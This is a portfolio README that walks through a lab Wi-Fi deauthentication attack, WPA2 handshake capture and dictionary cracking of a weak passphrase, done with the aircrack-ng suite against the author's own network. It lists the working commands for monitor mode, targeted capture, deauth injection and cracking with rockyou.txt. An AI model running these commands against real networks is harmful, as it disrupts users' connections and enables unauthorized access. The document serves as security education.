# Portfolio-DeauthAttack üîìüì°

This repository documents my **controlled Wi-Fi deauthentication (deauth) attack** and **WPA2 handshake capture** performed inside a **Kali Linux VM running on VMware Workstation Pro**. The objective: force a client on **my own test network** to disconnect, capture the WPA2 handshake, and crack a weak passphrase with the `aircrack-ng` suite.

> ‚ö†Ô∏è **Ethical Notice:** Performed only on a network I own, strictly for education and portfolio purposes. Do **not** test on networks without explicit authorization.

## üì∏ Step-By-Step Process (Commands + Evidence)

### 1) Detect Wireless Adapters
    iwconfig
Identify available interfaces before starting.

---

### 2) Enable Monitor Mode (Injection Adapter)
    sudo airmon-ng start wlan1
Enable monitor mode on the adapter dedicated to injection; this creates `wlan1mon`.

---

### 3) Scan Nearby Wi-Fi Networks (Discovery)
    sudo airodump-ng wlan1mon
Discover SSIDs/BSSIDs and confirm the target (**KC‚Äôs Mobile WPA2 Network**).

---

### 4) Focus on Target & Start Capture (Listener Adapter)
    sudo airodump-ng --bssid <TARGET_BSSID> -c <CHANNEL> -w capture wlan0
Lock onto the target AP on its channel and write packets to `capture.cap` using the listener interface.

---

### 5) Deauthenticate a Client (Trigger Handshake)
    sudo aireplay-ng --deauth 10 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan1mon
Send deauth frames from the injection adapter to force a reconnect, generating the WPA2 4-way handshake.

---

### 6) Crack the Captured Handshake
    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <TARGET_BSSID> capture-01.cap
Run a dictionary attack with `rockyou.txt` against the handshake capture.

## üñ•Ô∏è VMware & Hardware Notes

- **USB Passthrough:** Both **ALFA AWUS036ACM** adapters are attached directly to the guest VM for full monitor/injection support.  
- **Networking:** VM set to **NAT** for package updates; wireless adapters are **not** bridged as NICs‚Äîeach is passed through as a USB device to Kali.  
- **Driver Support:** Ensure chipset/driver support in Kali so `monitor` mode and injection function correctly.

---

## ‚úÖ Key Takeaways

- Practical use of **monitor mode** and **packet injection** to obtain a WPA2 handshake  
- Understanding of **BSSID vs. client MAC** roles during deauth  
- Successful **dictionary attack** demonstrating risk of weak passphrases  
- Solid **VMware + USB Wi-Fi** lab configuration with **ALFA AWUS036ACM** adapters

## ‚öñÔ∏è Legal & Ethical Reminder

This methodology is provided for **defensive education**. Always obtain **explicit written permission** before testing any network you don‚Äôt own. Unauthorized access is illegal and unethical.
